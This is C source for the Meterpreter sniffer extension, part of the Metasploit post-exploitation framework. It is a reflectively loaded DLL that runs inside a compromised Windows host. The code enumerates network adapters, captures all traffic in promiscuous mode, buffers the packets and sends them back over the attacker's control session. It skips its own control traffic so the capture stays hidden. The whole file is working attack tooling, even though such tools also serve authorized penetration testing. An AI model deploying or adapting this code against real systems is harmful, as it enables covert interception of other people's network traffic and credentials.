/*!
 * @file sniffer.c
 * @brief Definition for packet capture functionality.
 */

#define _CRT_SECURE_NO_DEPRECATE 1

#include "precomp.h"
#include "common_metapi.h"

// Required so that use of the API works.
MetApi* met_api = NULL;

DWORD request_sniffer_interfaces(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_start(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_release(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_dump_read(Remote *remote, Packet *packet);

/*! @brief List of custom commands provided by the sniffer extension. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_SNIFFER_INTERFACES, request_sniffer_interfaces),
	COMMAND_REQ(COMMAND_ID_SNIFFER_CAPTURE_START, request_sniffer_capture_start),
	COMMAND_REQ(COMMAND_ID_SNIFFER_CAPTURE_STOP, request_sniffer_capture_stop),
	COMMAND_REQ(COMMAND_ID_SNIFFER_CAPTURE_STATS, request_sniffer_capture_stats),
	COMMAND_REQ(COMMAND_ID_SNIFFER_CAPTURE_RELEASE, request_sniffer_capture_release),
	COMMAND_REQ(COMMAND_ID_SNIFFER_CAPTURE_DUMP, request_sniffer_capture_dump),
	COMMAND_REQ(COMMAND_ID_SNIFFER_CAPTURE_DUMP_READ, request_sniffer_capture_dump_read),
	COMMAND_TERMINATOR
};

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#define check_pssdk(); if(!hMgr && pktsdk_initialize()!=0){ met_api->packet.transmit_response(hErr, remote, response);return(hErr); }

HANDLE hMgr;
DWORD hErr;

/*!
 * @brief Initialises the packet sniffer SDK.
 * @returns Indication of success or failure.
 * @retval ERROR_ACCESS_DENIED The packet sniffer SDK failed to create a PSSDK manager instance.
 *                             This could be due to insufficient privs (run as root/SYSTEM).
 * @retval ERROR_SUCCESS Initialisation was successful.
 */
DWORD pktsdk_initialize(void)
{
	dprintf("sniffer>> calling MgrCreate()...");

	hMgr = MgrCreate();
	if(! hMgr)
	{
		dprintf("sniffer>> failed to allocate a new Mgr object");
		hErr = ERROR_ACCESS_DENIED;
		return(hErr);
	}

	hErr = MgrInitialize(hMgr);
	if(hErr != HNERR_OK)
	{
		MgrDestroy(hMgr);
		hMgr = NULL;
	}

	dprintf("sniffer>> Mgr object initialized with return %d (handle %d)", hErr, hMgr);
	return hErr;
}

HANDLE pktsdk_interface_by_index(unsigned int fidx) {
	unsigned idx = 1;
	HANDLE hCfg;

	dprintf("sniffer>> pktsdk_interface_by_index(%d)", fidx);

	hCfg = MgrGetFirstAdapterCfg(hMgr);
	do {
		if(fidx == idx++) return hCfg;
	}while((hCfg = MgrGetNextAdapterCfg(hMgr,hCfg)) != NULL);
	return NULL;
}

int sniffer_includeports[1024];
int sniffer_excludeports[1024];

void __stdcall sniffer_receive(DWORD_PTR Param, DWORD_PTR ThParam, HANDLE hPacket, LPVOID pPacketData, DWORD IncPacketSize);



struct sockaddr peername;
int peername_len;

struct sockaddr_in *peername4;
struct sockaddr_in6 *peername6;

/* mutex */
LOCK *snifferm;

#define SNIFFER_MAX_INTERFACES 128 // let's hope interface index don't go above this value
#define SNIFFER_MAX_QUEUE  200000 // ~290Mb @ 1514 bytes

CaptureJob open_captures[SNIFFER_MAX_INTERFACES];

HANDLE pktsdk_interface_by_index(unsigned int fidx);
DWORD pktsdk_initialize(void);


DWORD request_sniffer_interfaces(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	Tlv entries[8];

	/*
		0: Index
		1: Name
		2: Description
		3: Type
		4: MTU
		5: Wireless?
		6: Accessible?
		7: DHCP?
		*/
	DWORD result = ERROR_SUCCESS;

	HANDLE hCfg;
	unsigned int idx = 1;

	check_pssdk();

	hCfg = MgrGetFirstAdapterCfg(hMgr);

	do
	{
		unsigned char *aname = (unsigned char *)AdpCfgGetAdapterNameA(hCfg);
		unsigned char *adesc = (unsigned char *)AdpCfgGetAdapterDescriptionA(hCfg);
		unsigned int ahand = htonl((unsigned int)hCfg);
		unsigned int atype = htonl(AdpCfgGetAdapterType(hCfg));
		unsigned int amtu = htonl(AdpCfgGetMaxPacketSize(hCfg));
		unsigned int aidx = htonl(idx);

		BOOL awireless = AdpCfgIsWireless(hCfg);
		BOOL ausable = AdpCfgGetAccessibleState(hCfg);
		BOOL adhcp = AdpCfgGetDhcpState(hCfg);

		memset(entries, 0, sizeof(entries));

		dprintf("sniffer>> interface %d - %s - %s", idx, aname, adesc);

		entries[0].header.type = TLV_TYPE_UINT;
		entries[0].header.length = sizeof(unsigned int);
		entries[0].buffer = (PUCHAR)&aidx;

		entries[1].header.type = TLV_TYPE_STRING;
		entries[1].header.length = (DWORD)strlen(aname) + 1;
		entries[1].buffer = aname;

		entries[2].header.type = TLV_TYPE_STRING;
		entries[2].header.length = (DWORD)strlen(adesc) + 1;
		entries[2].buffer = adesc;

		entries[3].header.type = TLV_TYPE_UINT;
		entries[3].header.length = sizeof(unsigned int);
		entries[3].buffer = (PUCHAR)&atype;

		entries[4].header.type = TLV_TYPE_UINT;
		entries[4].header.length = sizeof(unsigned int);
		entries[4].buffer = (PUCHAR)&amtu;

		entries[5].header.type = TLV_TYPE_BOOL;
		entries[5].header.length = sizeof(BOOL);
		entries[5].buffer = (PUCHAR)&awireless;

		entries[6].header.type = TLV_TYPE_BOOL;
		entries[6].header.length = sizeof(BOOL);
		entries[6].buffer = (PUCHAR)&ausable;

		entries[7].header.type = TLV_TYPE_BOOL;
		entries[7].header.length = sizeof(BOOL);
		entries[7].buffer = (PUCHAR)&adhcp;

		met_api->packet.add_tlv_group(response, TLV_TYPE_SNIFFER_INTERFACES, entries, 8);

		idx++;
	} while ((hCfg = MgrGetNextAdapterCfg(hMgr, hCfg)) != NULL);


	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

void __stdcall sniffer_receive(DWORD_PTR Param, DWORD_PTR ThParam, HANDLE hPacket, LPVOID pPacketData, DWORD IncPacketSize)
{
	CaptureJob *j;
	HANDLE pkt;
	unsigned char *pktbuf;
	unsigned char *pktmax;
	struct eth_hdr *eth;
	struct ip_hdr *ip;
	struct tcp_hdr *tcp;
	//	struct udp_hdr *udp;

	j = (CaptureJob *)Param;
	pktbuf = (unsigned char *)pPacketData;
	pktmax = pktbuf + IncPacketSize;

	// Only process active jobs
	if (!j->active) return;

	// Traffic filtering goes here
	do
	{
		// Skip matching on short packets
		if (IncPacketSize < ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN)
		{
			dprintf("sniffer>> skipping exclusion because the packet is too small");
			break;
		}

		// Match IP packets
		if (!peername4)
		{
			dprintf("sniffer>> skipping exclusion because peername4 is not defined");
			break;
		}

		// Skip non-IP packets
		eth = (struct eth_hdr *) pktbuf;
		if (ntohs(eth->eth_type) != ETH_TYPE_IP)
		{
			dprintf("sniffer>> skipping non-IP packet from filter");
			break;
		}

		// Skip non-TCP/UDP packets
		ip = (struct ip_hdr *) &pktbuf[ETH_HDR_LEN];
		if (ip->ip_p != IP_PROTO_TCP && ip->ip_p != IP_PROTO_UDP)
		{
			dprintf("sniffer>> skipping non-TCP/UDP packet from filter: %d", ip->ip_p);
			break;
		}

		if (ip->ip_p == IP_PROTO_TCP)
		{
			tcp = (struct tcp_hdr *) &pktbuf[ETH_HDR_LEN + (ip->ip_hl * 4)];
			if ((unsigned char *)tcp + TCP_HDR_LEN > pktmax)
			{
				dprintf("sniffer>> TCP packet is too short");
				break;
			}

			// Ignore our own control session's traffic
			if ((memcmp(&ip->ip_src, &peername4->sin_addr, 4) == 0 && tcp->th_sport == peername4->sin_port) ||
				(memcmp(&ip->ip_dst, &peername4->sin_addr, 4) == 0 && tcp->th_dport == peername4->sin_port))
			{
				return;
			}
			// TODO: Scan through a list of included/excluded ports
		}

		// All done matching exclusions
	} while (0);

	// Thread-synchronized access to the queue

	//    -- PKS, per job locking would be finer grained.
	//       however, it probably doesn't matter.

	met_api->lock.acquire(snifferm);

	if (j->idx_pkts >= j->max_pkts) j->idx_pkts = 0;
	j->cur_pkts++;
	j->cur_bytes += IncPacketSize;

	pkt = PktCreate(j->mtu);
	PktCopyPacketToPacket(pkt, hPacket);

	if (j->pkts[j->idx_pkts])
	{
		PktDestroy(j->pkts[j->idx_pkts]);
	}

	j->pkts[j->idx_pkts] = pkt;
	j->idx_pkts++;

	met_api->lock.release(snifferm);
}

DWORD request_sniffer_capture_start(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	unsigned int ifid;
	unsigned int maxp;
	CaptureJob *j;
	DWORD result;
	HANDLE ifh;

	check_pssdk();
	dprintf("sniffer>> start_capture()");

	ifid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	maxp = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_PACKET_COUNT);
	maxp = min(maxp, SNIFFER_MAX_QUEUE);
	maxp = max(maxp, 1);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		ifh = pktsdk_interface_by_index(ifid);
		if (ifh == NULL)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface is already being captured
		if (j->active)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j->adp = AdpCreate();
		dprintf("sniffer>> capture_start() AdpCreate: 0x%.8x", j->adp);

		AdpSetConfig(j->adp, ifh);
		hErr = AdpOpenAdapter(j->adp);
		dprintf("sniffer>> capture_start() AdpOpenAdapter: 0x%.8x", hErr);

		if (hErr != HNERR_OK)
		{
			AdpDestroy(j->adp);
			result = hErr;
			break;
		}

		j->capture_linktype = 1; //  LINKTYPE_ETHERNET forced on windows

		j->pkts = calloc(maxp, sizeof(*(j->pkts)));
		if (j->pkts == NULL) {
			AdpCloseAdapter(j->adp);
			AdpDestroy(j->adp);
			result = ERROR_ACCESS_DENIED;
			break;
		}

		j->active = 1;
		j->intf = ifid;
		j->max_pkts = maxp;
		j->cur_pkts = 0;
		j->mtu = AdpCfgGetMaxPacketSize(AdpGetConfig(j->adp));

		AdpSetOnPacketRecv(j->adp, (FARPROC)sniffer_receive, (DWORD_PTR)j);
		AdpSetMacFilter(j->adp, mfAll);
	} while (0);

	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> stop_capture()");

	ifid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> stop_capture(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface is not being captured
		if (!j->adp)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		met_api->lock.acquire(snifferm);

		j->active = 0;
		AdpSetMacFilter(j->adp, 0);
		AdpCloseAdapter(j->adp);
		AdpDestroy(j->adp);

		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int)j->cur_bytes);

		met_api->lock.release(snifferm);

		dprintf("sniffer>> stop_capture() interface %d processed %d packets/%d bytes", j->intf, j->cur_pkts, j->cur_bytes);
	} while (0);

	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_release(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	unsigned int ifid, i;
	CaptureJob *j;
	DWORD result;
	BOOL test_parameters;

	check_pssdk();
	dprintf("sniffer>> release_capture()");

	ifid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> release_capture(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface is not being captured
		test_parameters = !j->adp || j->active == 1;
		if (test_parameters)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		met_api->lock.acquire(snifferm);

		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int)j->cur_bytes);
		dprintf("sniffer>> release_capture() interface %d released %d packets/%d bytes", j->intf, j->cur_pkts, j->cur_bytes);

		for (i = 0; i < j->max_pkts; i++)
		{
			if (!j->pkts[i]) break;

			PktDestroy(j->pkts[i]);
			j->pkts[i] = NULL;
		}

		free(j->pkts);
		memset(j, 0, sizeof(CaptureJob));

		met_api->lock.release(snifferm);


	} while (0);

	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> capture_stats()");

	ifid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_stats(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface was not captured
		if (!j->adp)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		met_api->lock.acquire(snifferm);
		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int)j->cur_bytes);
		met_api->lock.release(snifferm);
	} while (0);

	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_dump_read(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	unsigned int ifid, i;
	unsigned int bcnt;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> capture_dump_read()");

	ifid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	bcnt = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_BYTE_COUNT);
	bcnt = min(bcnt, 32 * 1024 * 1024);

	dprintf("sniffer>> capture_dump_read(0x%.8x, %d)", ifid, bcnt);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, 0);
			goto fail;
		}

		j = &open_captures[ifid];

		if (!j->dbuf)
		{
			met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, 0);
			goto fail;
		}

		if (j->didx + bcnt > j->dlen)
		{
			bcnt = j->dlen - j->didx;
		}

		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, bcnt);
		met_api->packet.add_tlv_raw(response, TLV_TYPE_SNIFFER_PACKET, (unsigned char *)j->dbuf + j->didx, bcnt);
		j->didx += bcnt;
	} while (0);

	// Free memory if the read is complete
	if (j->didx >= j->dlen - 1)
	{
		free(j->dbuf);
		j->dbuf = NULL;
		j->didx = 0;
		j->dlen = 0;
		// if dump occurs when interface is not active, i.e sniff has ended, release info
		if (j->active == 0)
		{
			dprintf("sniffer>> capture_dump_read, release CaptureJob");
			met_api->lock.acquire(snifferm);
			for (i = 0; i < j->max_pkts; i++)
			{
				if (!j->pkts[i]) break;
				PktDestroy(j->pkts[i]);
				j->pkts[i] = NULL;
			}

			free(j->pkts);
			memset(j, 0, sizeof(CaptureJob));
			met_api->lock.release(snifferm);
		}
	}

fail:
	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}


DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	unsigned int ifid;
	unsigned int rbuf, mbuf;
	unsigned int *tmp;

	CaptureJob *j;
	DWORD result, pcnt, rcnt, i;
#ifdef _WIN64
	ULONGLONG thilo;
#endif
	DWORD thi, tlo;

	check_pssdk();
	dprintf("sniffer>> capture_dump()");

	ifid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_dump(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	met_api->lock.acquire(snifferm);

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface was not captured
		if (!j->adp)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// Free any existing packet buffer
		if (j->dbuf)
		{
			free(j->dbuf);
			j->dbuf = NULL;
			j->dlen = 0;
			j->didx = 0;
		}

		// Add basic stats
		pcnt = 0;
		rcnt = 0;

		mbuf = (1024 * 1024);
		j->dbuf = malloc(mbuf);
		rbuf = 0;

		for (i = 0; i < j->max_pkts; i++)
		{
			if (!j->pkts[i]) break;

			rbuf += (8 + 8 + 4 + PktGetPacketSize(j->pkts[i]));
			if (mbuf < rbuf)
			{
				mbuf += (1024 * 1024);
				j->dbuf = realloc(j->dbuf, mbuf);

				if (!j->dbuf)
				{
					dprintf("sniffer>> realloc of %d bytes failed!", rbuf);
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
			}

			tmp = (unsigned int *)(j->dbuf + rcnt);
#ifdef _WIN64
			thilo = PktGetId(j->pkts[i]);
			thi = (DWORD)(thilo >> 32);
			tlo = (DWORD)(thilo & 0xFFFFFFFF);
#else
			tlo = PktGetId(j->pkts[i], &thi);
#endif
			*tmp = htonl(thi); tmp++;
			*tmp = htonl(tlo); tmp++;

#ifdef _WIN64
			thilo = PktGetTimeStamp(j->pkts[i]);
			thi = (DWORD)(thilo >> 32);
			tlo = (DWORD)(thilo & 0xFFFFFFFF);
#else
			tlo = PktGetTimeStamp(j->pkts[i], &thi);
#endif
			*tmp = htonl(thi); tmp++;
			*tmp = htonl(tlo); tmp++;

			tlo = PktGetPacketSize(j->pkts[i]);
			*tmp = htonl(tlo); tmp++;

			memcpy(j->dbuf + rcnt + 20, PktGetPacketData(j->pkts[i]), tlo);

			rcnt += 20 + tlo;
			pcnt++;

			PktDestroy(j->pkts[i]);
			j->pkts[i] = NULL;
		}

		j->dlen = rcnt;

		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, pcnt);
		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, rcnt);
		// add capture datalink, needed when saving capture file, use TLV_TYPE_SNIFFER_INTERFACE_ID not to create a new TLV type
		met_api->packet.add_tlv_uint(response, TLV_TYPE_SNIFFER_INTERFACE_ID, j->capture_linktype);

		dprintf("sniffer>> finished processing packets");

		j->cur_bytes = 0;
		j->cur_pkts = 0;
		j->idx_pkts = 0;
	} while (0);

	met_api->lock.release(snifferm);
	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;

	dprintf("[SERVER] Registering command handlers...");
	met_api->command.register_all(customCommands);

	dprintf("[SERVER] Memory reset of open_captures...");
	memset(open_captures, 0, sizeof(open_captures));

	// initialize structures for the packet sniffer sdk
	hMgr = NULL;
	hErr = 0;

	dprintf("[SERVER] Memory reset of include/exclude port lists...");
	// wipe the include/exclude ports empty
	memset(sniffer_includeports, 0, sizeof(sniffer_includeports));
	memset(sniffer_excludeports, 0, sizeof(sniffer_excludeports));
	sniffer_includeports[0] = -1;
	sniffer_excludeports[0] = -1;

	dprintf("[SERVER] Getting the peer name of our socket...");
	// get the address/port of the connected control socket
	peername4 = NULL;
	peername6 = NULL;
	peername_len = sizeof(peername);
	if (remote->transport->get_handle) {
		getpeername(remote->transport->get_handle(remote->transport), &peername, &peername_len);
		if(peername.sa_family == PF_INET)  peername4 = (struct sockaddr_in *)&peername;

		dprintf("[SERVER] Getting the IPv6 peer name of our socket...");
		if(peername.sa_family == PF_INET6) peername6 = (struct sockaddr_in6 *)&peername;
	}
	else {
	 // TODO: not sure what to do here
	}

	dprintf("[SERVER] Creating a lock...");
	snifferm = met_api->lock.create();

	return hErr;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all(customCommands);

	MgrDestroy(hMgr);
	met_api->lock.destroy(snifferm);
	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
